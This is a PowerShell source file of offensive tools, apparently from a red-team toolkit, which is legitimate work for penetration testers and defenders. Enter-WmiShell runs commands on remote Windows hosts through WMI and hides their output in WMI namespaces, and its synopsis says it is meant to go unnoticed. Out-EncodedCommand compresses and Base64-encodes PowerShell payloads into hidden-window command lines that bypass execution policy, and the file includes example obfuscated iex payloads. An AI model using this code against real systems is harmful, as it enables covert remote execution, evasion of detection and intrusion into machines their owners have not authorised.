function Enter-WmiShell{
<#
.SYNOPSIS

Creates a limited* interactive prompt to interact with windows machines in a sneaky way, that is likely to go unnoticed/undetected. Use
the command "exit" to close and cleanup the session; not doing so will leave data in the WMI namespaces.

Author: Jesse Davis (@secabstraction)
License: BSD 3-Clause
Required Dependencies: Out-EncodedCommand, Get-WmiShellOutput
Optional Dependencies: None
 
.DESCRIPTION

Enter-WmiShell accepts cmd-type commands to be executed on remote hosts via WMI. The output of those commands is captured, Base64 encoded,
and written to Namespaces in the WMI database.
 
.PARAMETER ComputerName 

Specifies the remote host to interact with.

.PARAMETER UserName

Specifies the Domain\UserName to create a credential object for authentication, will also accept a PSCredential object. If this parameter
isn't used, the credentials of the current session will be used.

.EXAMPLE

PS C:\> Enter-WmiShell -ComputerName Server01 -UserName Administrator

[Server01]: WmiShell>whoami
Server01\Administrator

.NOTES

This cmdlet was inspired by the work of Andrei Dumitrescu's python/vbScript implementation. However, this PowerShell implementation doesn't 
write any files (vbScript) to disk.

TODO
----

Add upload/download functionality

.LINK

http://www.secabstraction.com/

#>
    Param (	
        [Parameter(Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
		[string[]]$ComputerName,
		
        [Parameter()]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty
	) # End Param
     
        # Start WmiShell prompt
        $command = ""
        do{ 
            # Make a pretty prompt for the user to provide commands at
            Write-Host ("[" + $($ComputerName) + "]: WmiShell>") -nonewline -foregroundcolor green 
            $command = Read-Host

            # Execute commands on remote host 
            switch ($command) {
               "exit" { 
                    $null = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace root\default `
                    -Query "SELECT * FROM __Namespace WHERE Name LIKE 'EVILLTAG%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                }
                default { 
                    $remoteScript = @"
                    Get-WmiObject -Namespace root\default -Query "SELECT * FROM __Namespace WHERE Name LIKE 'EVILLTAG%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                    `$wshell = New-Object -c WScript.Shell
                    function Insert-Piece(`$i, `$piece) {
                            `$count = `$i.ToString()
	                        `$zeros = "0" * (6 - `$count.Length)
	                        `$tag = "EVILLTAG" + `$zeros + `$count
	                        `$piece = `$tag + `$piece 
	                        `$null = Set-WmiInstance -EnableAll -Namespace root\default -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$piece}
                        }
	                    `$cmdExec = `$wshell.Exec("%comspec% /c " + "$command") 
	                    `$cmdOut = `$cmdExec.StdOut.ReadAll()
                        `$outEnc = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$cmdOut))
                        `$outEnc = `$outEnc -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
                        `$nop = [Math]::Floor(`$outEnc.Length / 5500)
                        if (`$outEnc.Length -gt 5500) {
                            `$lastp = `$outEnc.Substring(`$outEnc.Length - (`$outEnc.Length % 5500), (`$outEnc.Length % 5500))
                            `$outEnc = `$outEnc.Remove(`$outEnc.Length - (`$outEnc.Length % 5500), (`$outEnc.Length % 5500))
                            for(`$i = 1; `$i -le `$nop; `$i++) { 
	                            `$piece = `$outEnc.Substring(0,5500)
		                        `$outEnc = `$outEnc.Substring(5500,(`$outEnc.Length - 5500))
		                        Insert-Piece `$i `$piece
                                #Start-Sleep -m 50
                            }
                            `$outEnc = `$lastp
                        }
	                    Insert-Piece (`$nop + 1) `$outEnc 
	                    `$null = Set-WmiInstance -EnableAll -Namespace root\default -Path __Namespace -PutType CreateOnly -Arguments @{Name='OUTPUT_READY'}
"@
                    $scriptBlock = [scriptblock]::Create($remoteScript)
                    $encPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $scriptBlock
                    $null = Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $encPosh
                    
                    # Wait for script to finish writing output to WMI namespaces
                    $outputReady = ""
                    do{$outputReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace root\default `
                                      -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
                    until($outputReady)
                    $null = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace root\default `
                            -Query "SELECT * FROM __Namespace WHERE Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                    
                    # Retrieve cmd output written to WMI namespaces 
                    Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName
                }
            }
        }until($command -eq "exit")
}
function Get-WmiShellOutput{
<#
.SYNOPSIS

Retrieves Base64 encoded data stored in WMI namspaces and decodes it.

Author: Jesse Davis (@secabstraction)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Get-WmiShellOutput will query the WMI namespaces of specified remote host(s) for encoded data, decode the retrieved data and write it to StdOut.
 
.PARAMETER ComputerName 

Specifies the remote host to retrieve data from.

.PARAMETER UserName

Specifies the Domain\UserName to create a credential object for authentication, will also accept a PSCredential object. If this parameter
isn't used, the credentials of the current session will be used.

.EXAMPLE

PS C:\> Get-WmiShellOutput -ComputerName Server01 -UserName Administrator

.NOTES

This cmdlet was inspired by the work of Andrei Dumitrescu's python implementation.

.LINK

http://www.secabstraction.com/

#>

	Param (
		[Parameter(Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
		[string[]]$ComputerName,
		[Parameter(ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty
	) #End Param
	
	$getOutput = @() 
	$getOutput = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace root\default `
                    -Query "SELECT Name FROM __Namespace WHERE Name like 'EVILLTAG%'" | % {$_.Name} | Sort-Object
	
	if ([BOOL]$getOutput.Length) {
		
	    $reconstructed = ""

        #Decode Base64 output
		foreach ($line in $getOutput) {
			$cleanString = $line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
			$reconstructed += $cleanString
        }
        # Decode base64 padded string and remove front side spaces
	    Try { $decodeString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reconstructed)) }
        Catch [System.Management.Automation.MethodInvocationException] {
	        Try { $decodeString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reconstructed + "=")) }
	        Catch [System.Management.Automation.MethodInvocationException] {
		        $decodeString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reconstructed + "==")) }
	        Finally {}
	    }
        Finally { Write-Host $decodeString }
        
    }
	

	else {
        #Decode single line Base64
		$getStrings = $getOutput.Name
		$cleanString = $getStrings.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
		Try { $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString)) }
		Catch [System.Management.Automation.MethodInvocationException] {
			Try { $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString + "=")) }
			Catch [System.Management.Automation.MethodInvocationException] {
			    $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString + "==")) }
			Finally {}
		}
		Finally { Write-Host $decodedOutput }    
    }
}
function Out-EncodedCommand {
<#
.SYNOPSIS

Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script.

PowerSploit Function: Out-EncodedCommand
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Out-EncodedCommand prepares a PowerShell script such that it can be pasted into a command prompt. The scenario for using this tool is the following: You compromise a machine, have a shell and want to execute a PowerShell script as a payload. This technique eliminates the need for an interactive PowerShell 'shell' and it bypasses any PowerShell execution policies.

.PARAMETER ScriptBlock

Specifies a scriptblock containing your payload.

.PARAMETER Path

Specifies the path to your payload.

.PARAMETER NoExit

Outputs the option to not exit after running startup commands.

.PARAMETER NoProfile

Outputs the option to not load the Windows PowerShell profile.

.PARAMETER NonInteractive

Outputs the option to not present an interactive prompt to the user.

.PARAMETER Wow64

Calls the x86 (Wow64) version of PowerShell on x86_64 Windows installations.

.PARAMETER WindowStyle

Outputs the option to set the window style to Normal, Minimized, Maximized or Hidden.

.PARAMETER EncodedOutput

Base-64 encodes the entirety of the output. This is usually unnecessary and effectively doubles the size of the output. This option is only for those who are extra paranoid.

.EXAMPLE

C:\PS> Out-EncodedCommand -ScriptBlock {Write-Host 'hello, world!'}

powershell -C sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('Cy/KLEnV9cgvLlFQz0jNycnXUSjPL8pJUVQHAA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()

.EXAMPLE

C:\PS> Out-EncodedCommand -Path C:\EvilPayload.ps1 -NonInteractive -NoProfile -WindowStyle Hidden -EncodedOutput

powershell -NoP -NonI -W Hidden -E cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcATABjAGkAeABDAHMASQB3AEUAQQBEAFEAWAAzAEUASQBWAEkAYwBtAEwAaQA1AEsAawBGAEsARQA2AGwAQgBCAFIAWABDADgAaABLAE8ATgBwAEwAawBRAEwANAAzACsAdgBRAGgAdQBqAHkAZABBADkAMQBqAHEAcwAzAG0AaQA1AFUAWABkADAAdgBUAG4ATQBUAEMAbQBnAEgAeAA0AFIAMAA4AEoAawAyAHgAaQA5AE0ANABDAE8AdwBvADcAQQBmAEwAdQBYAHMANQA0ADEATwBLAFcATQB2ADYAaQBoADkAawBOAHcATABpAHMAUgB1AGEANABWAGEAcQBVAEkAagArAFUATwBSAHUAVQBsAGkAWgBWAGcATwAyADQAbgB6AFYAMQB3ACsAWgA2AGUAbAB5ADYAWgBsADIAdAB2AGcAPQA9ACcAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkALABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA=

Description
-----------
Execute the above payload for the lulz. >D

.NOTES

This cmdlet was inspired by the createcmd.ps1 script introduced during Dave Kennedy and Josh Kelley's talk, "PowerShell...OMFG" (https://www.trustedsec.com/files/PowerShell_PoC.zip)

.LINK

http://www.exploit-monday.com
#>

    [CmdletBinding( DefaultParameterSetName = 'FilePath')] Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ParameterSetName = 'ScriptBlock' )]
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        $ScriptBlock,

        [Parameter(Position = 0, ParameterSetName = 'FilePath' )]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Switch]
        $NoExit,

        [Switch]
        $NoProfile,

        [Switch]
        $NonInteractive,

        [Switch]
        $Wow64,

        [ValidateSet('Normal', 'Minimized', 'Maximized', 'Hidden')]
        [String]
        $WindowStyle,

        [Switch]
        $EncodedOutput
    )

    if ($PSBoundParameters['Path'])
    {
        Get-ChildItem $Path -ErrorAction Stop | Out-Null
        $ScriptBytes = [IO.File]::ReadAllBytes((Resolve-Path $Path))
    }
    else
    {
        $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($ScriptBlock)
    }

    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
    $DeflateStream.Dispose()
    $CompressedScriptBytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)

    # Generate the code that will decompress and execute the payload.
    # This code is intentionally ugly to save space.
    $NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'

    # Base-64 strings passed to -EncodedCommand must be unicode encoded.
    $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
    $EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))

    # Build the command line options
    # Use the shortest possible command-line arguments to save space. Thanks @obscuresec for the idea.
    $CommandlineOptions = New-Object String[](0)
    if ($PSBoundParameters['NoExit'])
    { $CommandlineOptions += '-NoE' }
    if ($PSBoundParameters['NoProfile'])
    { $CommandlineOptions += '-NoP' }
    if ($PSBoundParameters['NonInteractive'])
    { $CommandlineOptions += '-NonI' }
    if ($PSBoundParameters['WindowStyle'])
    { $CommandlineOptions += "-W $($PSBoundParameters['WindowStyle'])" }

    $CmdMaxLength = 8190

    # Build up the full command-line string. Default to outputting a fully base-64 encoded command.
    # If the fully base-64 encoded output exceeds the cmd.exe character limit, fall back to partial
    # base-64 encoding to save space. Thanks @Carlos_Perez for the idea.
    if ($PSBoundParameters['Wow64'])
    {
        $CommandLineOutput = "$($Env:windir)\SysWOW64\WindowsPowerShell\v1.0\powershell.exe $($CommandlineOptions -join ' ') -C `"$NewScript`""

        if ($PSBoundParameters['EncodedOutput'] -or $CommandLineOutput.Length -le $CmdMaxLength)
        {
            $CommandLineOutput = "$($Env:windir)\SysWOW64\WindowsPowerShell\v1.0\powershell.exe $($CommandlineOptions -join ' ') -E `"$EncodedPayloadScript`""
        }

        if (($CommandLineOutput.Length -gt $CmdMaxLength) -and (-not $PSBoundParameters['EncodedOutput']))
        {
            $CommandLineOutput = "$($Env:windir)\SysWOW64\WindowsPowerShell\v1.0\powershell.exe $($CommandlineOptions -join ' ') -C `"$NewScript`""
        }
    }
    else
    {
        $CommandLineOutput = "powershell $($CommandlineOptions -join ' ') -C `"$NewScript`""

        if ($PSBoundParameters['EncodedOutput'] -or $CommandLineOutput.Length -le $CmdMaxLength)
        {
            $CommandLineOutput = "powershell $($CommandlineOptions -join ' ') -E `"$EncodedPayloadScript`""
        }

        if (($CommandLineOutput.Length -gt $CmdMaxLength) -and (-not $PSBoundParameters['EncodedOutput']))
        {
            $CommandLineOutput = "powershell $($CommandlineOptions -join ' ') -C `"$NewScript`""
        }
    }

    if ($CommandLineOutput.Length -gt $CmdMaxLength)
    {
            Write-Warning 'This command exceeds the cmd.exe maximum allowed length!'
    }

    Write-Output $CommandLineOutput
}